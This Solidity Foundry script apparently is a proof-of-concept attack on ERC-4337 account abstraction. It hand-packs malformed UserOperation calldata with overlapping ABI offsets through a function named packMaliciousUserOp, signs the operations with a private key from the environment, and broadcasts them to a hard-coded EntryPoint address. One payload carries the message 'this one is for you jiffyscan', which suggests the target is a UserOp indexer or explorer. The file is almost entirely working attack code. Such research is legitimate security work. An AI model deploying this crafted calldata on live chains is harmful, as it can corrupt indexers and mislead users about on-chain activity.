// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/TestSender.sol";
import "src/TestReceiver.sol";
import "src/core/EntryPoint.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";
using ECDSA for bytes32;


contract TestScript is Script {
    uint256 constant gas = 10000000008;

    TestSender sender;
    EntryPoint entrypoint;
    function setUp() public {
        entrypoint = EntryPoint(payable(0x0576a174D229E3cFA37253523E645A78A0C91B57));
    }

    function run() public {
        console.log(block.chainid);
        uint256 privKey = vm.envUint("PRIVATE_KEY");
        address payable beneficiary = payable(vm.addr(vm.envUint("PRIVATE_KEY")));
        vm.startBroadcast(privKey);
        TestReceiver r = new TestReceiver();
        sender = TestSender(payable(0x477A1860c3aC1920d4Cd6DD2782657342Ff2E640));
        bytes memory data1 = packMaliciousUserOp(
            4,
            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you jiffyscan"),
            100000,
            100000,
            100000,
            70000000000,
            70000000000
        );

        bytes memory data2 = packMaliciousUserOp(
            5,
            abi.encodeWithSelector(TestSender.execute.selector, address(r), 0, abi.encodeWithSelector(TestReceiver.reverting.selector)),
            100000,
            100000,
            100000,
            70000000000,
            70000000000
        );

        bytes memory c = abi.encodePacked(
            entrypoint.handleOps.selector,
            uint256(0x40),
            bytes12(0),
            address(beneficiary),
            uint256(2), // array length
            uint256(0x60), // 1st elem offset
            uint256(0x60 + data1.length),
            data1,
            data2
        );
        (bool success,) = address(entrypoint).call(c);
        require(success, "reverted");

    }

    function runOld() public {
        console.log("CHAINID");
        console.log(block.chainid);
        uint256 privKey = vm.envUint("PRIVATE_KEY");
        address payable beneficiary = payable(vm.addr(vm.envUint("PRIVATE_KEY")));
        vm.startBroadcast(privKey);
        sender = new TestSender(entrypoint);
        sender.setOwner(beneficiary);
        uint256 _length = 2;

        entrypoint.depositTo{value:1e17}(address(sender));
        address(sender).call{value:10*_length}("");

        bytes memory data1 = packMaliciousUserOp(
            0,
            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 1, ""),
            100000,
            100000,
            100000,
            70000000000,
            70000000000
        );

        bytes memory data2 = packMaliciousUserOp(
            1,
            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 2, "hello world"),
            100000,
            100000,
            100000,
            70000000000,
            70000000000
        );

        bytes memory c = abi.encodePacked(
            entrypoint.handleOps.selector,
            uint256(0x40),
            bytes12(0),
            address(beneficiary),
            uint256(2), // array length
            uint256(0x60), // 1st elem offset
            uint256(0x60 + data1.length),
            data1,
            data2
        );
        (bool success,) = address(entrypoint).call{gas : 700000}(c);
        require(success, "reverted");
    }

    function fillUserOp(
        address _to,
        uint256 _value,
        bytes memory _data
    ) public view returns(UserOperation memory op) {
        op.sender = address(sender);
        op.nonce = 0;
        op.callData = abi.encodeWithSelector(TestSender.execute.selector, _to, _value, _data);
        op.callGasLimit = 50000;
        op.verificationGasLimit = 30000;
        op.preVerificationGas = 50000;
        op.maxFeePerGas = gas;
        op.maxPriorityFeePerGas = gas;
    }

    function packMaliciousUserOp(
        uint256 _nonceDelta,
        bytes memory _data,
        uint256 _callgasLimit,
        uint256 _verificationgasLimit,
        uint256 _preverificationgas,
        uint256 _maxfeepergas,
        uint256 _maxpriorityfeepergas
    ) public returns(bytes memory data) {
        uint256 offsetInitCode = 0x1e0;
        uint256 offsetCallData = 0x200;
        uint256 offsetPaymasterAndData = 0x1f0;
        uint256 nonce = 0x160 + 0x60 + _nonceDelta;
        data = abi.encodePacked(
            uint256(32),
            bytes12(0),
            address(sender),
            nonce, // nonce
            uint256(offsetInitCode),
            uint256(offsetCallData),
            uint256(_callgasLimit), // callgaslimit
            uint256(_verificationgasLimit), // verificationgaslimit
            uint256(_preverificationgas), // preverificationgas
            uint256(_maxfeepergas), // maxfeepergas
            uint256(_maxpriorityfeepergas),   // maxpriorityfeepergas
            uint256(offsetPaymasterAndData),
            uint256(32)
        );  // signature offset
        uint256 privKey = vm.envUint("PRIVATE_KEY");

        bytes memory empty = hex"";
        bytes32 hash = keccak256(
            abi.encodePacked(
                block.chainid,
                address(entrypoint),
                address(sender),
                uint256(nonce), // nonce
                empty,
                _data,
                _callgasLimit,
                _verificationgasLimit,
                _preverificationgas,
                _maxfeepergas,
                _maxpriorityfeepergas,
                empty
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, hash.toEthSignedMessageHash());

        data = abi.encodePacked(
            data,
            r,   // signature 
            s,   // signature 
            uint256(v),   // signature 
            uint256(0),   // initcodeLength
            uint256(0),   // paymaster
            uint256(_data.length),   // calldataLength
            _data // calldata
        );

        bytes memory signature = abi.encodePacked(r, s, v);
    }

}
